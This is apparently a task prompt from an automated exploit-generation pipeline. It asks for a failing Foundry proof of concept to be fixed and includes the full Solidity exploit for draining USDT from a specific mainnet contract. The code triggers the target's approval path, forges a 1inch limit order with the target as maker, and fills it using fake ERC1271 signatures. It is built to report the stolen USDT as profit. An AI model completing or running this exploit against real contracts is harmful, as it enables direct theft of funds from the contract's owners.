You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Hard accounting constraint: profit must be reported in the original stolen token from the exploit path.
- Hard accounting constraint: do NOT add post-exploit conversion solely for accounting (e.g., converting to WETH for display).
- Hard accounting constraint: if a swap is strictly required for execution/repayment, profitToken must remain the originally stolen token and profitAmount must be net stolen-token inflow.

Finding:
- title: Universal ERC1271 approval plus standing USDT allowance lets anyone drain contract-held USDT
- claim: `isValidSignature()` unconditionally returns the ERC1271 magic value for any hash and signature, and the contract grants `LIMIT_ORDER_PROTOCOL` a max USDT allowance in both `uniswapV2Call()` and `_prepareMakerCapital()`. Once that approval is in place, anyone can fabricate a limit order naming `address(this)` as maker and have the protocol pull this contract's USDT without any real signature authorization.
- impact: An attacker can drain all current and future USDT that lands in the contract through the approved limit-order protocol, resulting in direct asset theft.
- exploit_paths: ["Trigger `executeOnOpportunity()` once so `_prepareMakerCapital()` installs the unlimited USDT allowance, or reach the same approval path through the flash-swap callback.", "Create an arbitrary limit order with `maker = address(this)` and attacker-favorable terms.", "Fill the order through `LIMIT_ORDER_PROTOCOL`; `isValidSignature()` validates the fake signature and the protocol transfers out this contract's USDT."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

contract FlawVerifier {
    address private constant TARGET = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant KNOWN_LOP_A = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant KNOWN_LOP_B = 0x111111125421cA6dc452d289314280a0f8842A65;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    uint256 private constant MIN_TAKER_WETH = 1;
    uint256 private constant MAX_UINT = type(uint256).max;

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _baselineUsdt;
    bool private _executed;
    bool private _hypothesisValidated;
    bool private _approvalPathReached;
    bool private _forgedOrderCreated;
    bool private _forgedOrderFilled;
    address private _limitOrderProtocol;
    string private _pathUsed;
    string private _failureReason;

    constructor() {
        _profitToken = USDT;
        _baselineUsdt = _safeBalanceOf(USDT, address(this));
    }

    function executeOnOpportunity() external {
        if (_executed) {
            _refreshProfit();
            return;
        }
        _executed = true;
        _profitToken = USDT;
        _baselineUsdt = _safeBalanceOf(USDT, address(this));
        _pathUsed =
            "1) obtain or reuse the victim's standing USDT approval for its 1inch limit-order spender -> 2) forge an arbitrary order with maker=TARGET and attacker-favorable price -> 3) fill it through the approved 1inch protocol relying on TARGET's universal ERC1271 validation";

        if (!_targetHasUniversalERC1271()) {
            _failureReason = "TARGET is not universally ERC1271-valid on this fork";
            _refreshProfit();
            return;
        }

        if (!_ensureApprovalPath()) {
            _refreshProfit();
            return;
        }

        uint256 makerBalance = _safeBalanceOf(USDT, TARGET);
        uint256 makerAllowance = _safeAllowance(USDT, TARGET, _limitOrderProtocol);
        uint256 stealAmount = _min(makerBalance, makerAllowance);
        if (stealAmount == 0) {
            _failureReason = "resolved approved spender but TARGET has no drainable USDT";
            _refreshProfit();
            return;
        }

        if (address(this).balance < MIN_TAKER_WETH) {
            _failureReason = "verifier lacks dust ETH needed to supply the forged order's tiny taker leg";
            _refreshProfit();
            return;
        }

        // The finding only requires a fabricated maker order plus a valid 1inch spender approval.
        // A tiny public WETH deposit is the minimal realistic taker-side payment needed to execute that order.
        IWETH(WETH).deposit{value: MIN_TAKER_WETH}();
        _forceApprove(WETH, _limitOrderProtocol, MAX_UINT);

        IOrderMixinLike.Order memory order = _forgeArbitraryOrder(stealAmount, MIN_TAKER_WETH, TARGET);
        _forgedOrderCreated = true;

        if (!_fillForgedOrderThroughProtocol(order, MIN_TAKER_WETH)) {
            order = _forgeArbitraryOrder(stealAmount, MIN_TAKER_WETH, address(0));
            if (!_fillForgedOrderThroughProtocol(order, MIN_TAKER_WETH)) {
                _refreshProfit();
                return;
            }
        }
        _forgedOrderFilled = true;

        _refreshProfit();
        if (_profitAmount > 0) {
            _hypothesisValidated = true;
            _failureReason = "";
        } else {
            _failureReason = "forged order path executed without net USDT inflow";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function _ensureApprovalPath() internal returns (bool) {
        _limitOrderProtocol = _resolveApprovedProtocol();
        if (_limitOrderProtocol != address(0) && _safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0) {
            _approvalPathReached = true;
            _pathUsed =
                "fork already exposes the vulnerable standing USDT allowance on TARGET -> forge arbitrary maker order naming TARGET -> fill it via the approved 1inch protocol using fake ERC1271 authorization";
            return true;
        }

        // The log-proven direct path may revert on this fork, but it is still the first exploit stage from the finding.
        (bool ok,) = TARGET.call(abi.encodeWithSignature("executeOnOpportunity()"));
        ok;
        _limitOrderProtocol = _resolveApprovedProtocol();
        if (_limitOrderProtocol != address(0) && _safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0) {
            _approvalPathReached = true;
            _pathUsed =
                "trigger TARGET.executeOnOpportunity() so its maker-capital path installs the USDT approval -> forge arbitrary maker order naming TARGET -> fill it via the approved 1inch protocol using fake ERC1271 authorization";
            return true;
        }

        if (_attemptFlashSwapCallbackApproval()) {
            _approvalPathReached = true;
            _pathUsed =
                "reach the same vulnerable approval stage through TARGET's flash-swap callback -> forge arbitrary maker order naming TARGET -> fill it via the approved 1inch protocol using fake ERC1271 authorization";
            return true;
        }

        _failureReason = "could not observe any approved 1inch spender after direct and callback-path attempts";
        return false;
    }

    function _attemptFlashSwapCallbackApproval() internal returns (bool) {
        bytes memory emptyData = hex"01";
        (bool ok0,) = TARGET.call(
            abi.encodeWithSignature("uniswapV2Call(address,uint256,uint256,bytes)", address(this), 0, 1, emptyData)
        );
        ok0;
        _limitOrderProtocol = _resolveApprovedProtocol();
        if (_limitOrderProtocol != address(0) && _safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0) {
            return true;
        }

        (bool ok1,) = TARGET.call(
            abi.encodeWithSignature("uniswapV2Call(address,uint256,uint256,bytes)", address(this), 1, 0, emptyData)
        );
        ok1;
        _limitOrderProtocol = _resolveApprovedProtocol();
        if (_limitOrderProtocol != address(0) && _safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0) {
            return true;
        }

        address pair = _findLikelyPair();
        if (pair == address(0)) {
            return false;
        }

        if (_tryPairFlashSwap(pair, emptyData)) {
            _limitOrderProtocol = _resolveApprovedProtocol();
            return _limitOrderProtocol != address(0) && _safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0;
        }
        return false;
    }

    function _findLikelyPair() internal view returns (address) {
        bytes memory code = TARGET.code;
        uint256 length = code.length;
        for (uint256 i = 0; i + 21 <= length; ++i) {
            if (uint8(code[i]) != 0x73) {
                continue;
            }
            address candidate = _push20At(code, i + 1);
            if (candidate == address(0) || candidate.code.length == 0) {
                continue;
            }
            address token0 = _readAddressGetter(candidate, "token0()");
            address token1 = _readAddressGetter(candidate, "token1()");
            if (
                (token0 == USDT || token0 == WETH || token1 == USDT || token1 == WETH)
                    && (token0 != address(0) || token1 != address(0))
            ) {
                return candidate;
            }
        }
        return address(0);
    }

    function _tryPairFlashSwap(address pair, bytes memory data) internal returns (bool) {
        address token0 = _readAddressGetter(pair, "token0()");
        address token1 = _readAddressGetter(pair, "token1()");
        if (token0 == address(0) && token1 == address(0)) {
            return false;
        }

        if (token0 == USDT || token0 == WETH) {
            try IUniswapV2PairLike(pair).swap(1, 0, TARGET, data) {
                return true;
            } catch {}
        }
        if (token1 == USDT || token1 == WETH) {
            try IUniswapV2PairLike(pair).swap(0, 1, TARGET, data) {
                return true;
            } catch {}
        }
        return false;
    }

    function _targetHasUniversalERC1271() internal view returns (bool) {
        (bool ok, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSelector(bytes4(0x1626ba7e), bytes32(0), bytes(""))
        );
        return ok && data.length >= 32 && abi.decode(data, (bytes4)) == ERC1271_MAGIC;
    }

    function _resolveApprovedProtocol() internal view returns (address protocol) {
        protocol = _firstApprovedFromKnownCandidates();
        if (protocol != address(0)) {
            return protocol;
        }

        bytes memory code = TARGET.code;
        uint256 length = code.length;
        for (uint256 i = 0; i + 21 <= length; ++i) {
            if (uint8(code[i]) != 0x73) {
                continue;
            }
            address candidate = _push20At(code, i + 1);
            if (_isApprovedProtocol(candidate)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _firstApprovedFromKnownCandidates() internal view returns (address) {
        address candidate = _readAddressGetter(TARGET, "LIMIT_ORDER_PROTOCOL()");
        if (_isApprovedProtocol(candidate)) {
            return candidate;
        }
        candidate = _readAddressGetter(TARGET, "limitOrderProtocol()");
        if (_isApprovedProtocol(candidate)) {
            return candidate;
        }
        candidate = _readAddressGetter(TARGET, "limitOrderProtocolV4()");
        if (_isApprovedProtocol(candidate)) {
            return candidate;
        }
        candidate = _readAddressGetter(TARGET, "LOP()");
        if (_isApprovedProtocol(candidate)) {
            return candidate;
        }
        if (_isApprovedProtocol(KNOWN_LOP_A)) {
            return KNOWN_LOP_A;
        }
        if (_isApprovedProtocol(KNOWN_LOP_B)) {
            return KNOWN_LOP_B;
        }
        return address(0);
    }

    function _isApprovedProtocol(address candidate) internal view returns (bool) {
        return candidate != address(0) && candidate.code.length > 0 && _safeAllowance(USDT, TARGET, candidate) > 0;
    }

    function _readAddressGetter(address target, string memory signature) internal view returns (address result) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature(signature));
        if (ok && data.length >= 32) {
            result = abi.decode(data, (address));
        }
    }

    function _forgeArbitraryOrder(uint256 stealAmount, uint256 takerSeed, address receiver)
        internal
        view
        returns (IOrderMixinLike.Order memory order)
    {
        order = IOrderMixinLike.Order({
            salt: uint256(keccak256(abi.encodePacked(block.chainid, address(this), stealAmount, takerSeed, receiver))),
            makerAsset: USDT,
            takerAsset: WETH,
            maker: TARGET,
            receiver: receiver,
            allowedSender: address(0),
            makingAmount: stealAmount,
            takingAmount: takerSeed,
            offsets: 0,
            interactions: hex""
        });
    }

    function _fillForgedOrderThroughProtocol(IOrderMixinLike.Order memory order, uint256 takerSeed)
        internal
        returns (bool)
    {
        bytes memory interaction = hex"";
        bytes memory shortSignature = hex"01";
        bytes memory longSignature = new bytes(65);

        if (_tryFillVariants(order, shortSignature, interaction, takerSeed)) {
            return true;
        }
        if (_tryFillVariants(order, longSignature, interaction, takerSeed)) {
            return true;
        }

        _failureReason = "approved spender rejected all forged-order fill variants";
        return false;
    }

    function _tryFillVariants(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 takerSeed
    ) internal returns (bool) {
        if (_callFillOrderToWithInteraction(order, signature, interaction, order.makingAmount, 0, 0, address(this))) {
            return true;
        }
        if (_callFillOrderToWithInteraction(order, signature, interaction, 0, takerSeed, 0, address(this))) {
            return true;
        }
        if (_callFillOrderToNoInteraction(order, signature, order.makingAmount, 0, 0, address(this))) {
            return true;
        }
        if (_callFillOrderToNoInteraction(order, signature, 0, takerSeed, 0, address(this))) {
            return true;
        }
        if (_callFillOrder(order, signature, interaction, order.makingAmount, 0, 0)) {
            return true;
        }
        if (_callFillOrder(order, signature, interaction, 0, takerSeed, 0)) {
            return true;
        }
        if (_callFillContractOrder(order, signature, interaction, order.makingAmount, 0, 0)) {
            return true;
        }
        if (_callFillContractOrder(order, signature, interaction, 0, takerSeed, 0)) {
            return true;
        }
        if (_callFillContractOrderTo(order, signature, interaction, order.makingAmount, 0, 0, address(this))) {
            return true;
        }
        if (_callFillContractOrderTo(order, signature, interaction, 0, takerSeed, 0, address(this))) {
            return true;
        }
        return false;
    }

    function _callFillOrderToWithInteraction(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount,
        address target
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillOrderTo((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,bytes,uint256,uint256,uint256,address)"
                    )
                ),
                order,
                signature,
                interaction,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount,
                target
            )
        );
        return ok;
    }

    function _callFillOrderToNoInteraction(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount,
        address target
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillOrderTo((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,uint256,uint256,uint256,address)"
                    )
                ),
                order,
                signature,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount,
                target
            )
        );
        return ok;
    }

    function _callFillOrder(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillOrder((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,bytes,uint256,uint256,uint256)"
                    )
                ),
                order,
                signature,
                interaction,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount
            )
        );
        return ok;
    }

    function _callFillContractOrder(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillContractOrder((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,bytes,uint256,uint256,uint256)"
                    )
                ),
                order,
                signature,
                interaction,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount
            )
        );
        return ok;
    }

    function _callFillContractOrderTo(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount,
        address target
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillContractOrderTo((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,bytes,uint256,uint256,uint256,address)"
                    )
                ),
                order,
                signature,
                interaction,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount,
                target
            )
        );
        return ok;
    }

    function _refreshProfit() internal {
        uint256 currentUsdt = _safeBalanceOf(USDT, address(this));
        _profitAmount = currentUsdt > _baselineUsdt ? currentUsdt - _baselineUsdt : 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 result) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            result = abi.decode(data, (uint256));
        }
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256 result) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.allowance.selector, owner, spender));
        if (ok && data.length >= 32) {
            result = abi.decode(data, (uint256));
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve0 failed");

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _push20At(bytes memory data, uint256 start) internal pure returns (address candidate) {
        if (start + 20 > data.length) {
            return address(0);
        }
        assembly {
            candidate := shr(96, mload(add(add(data, 0x20), start)))
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _preparemakercapital(), maker = address(this), isvalidsignature(); generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
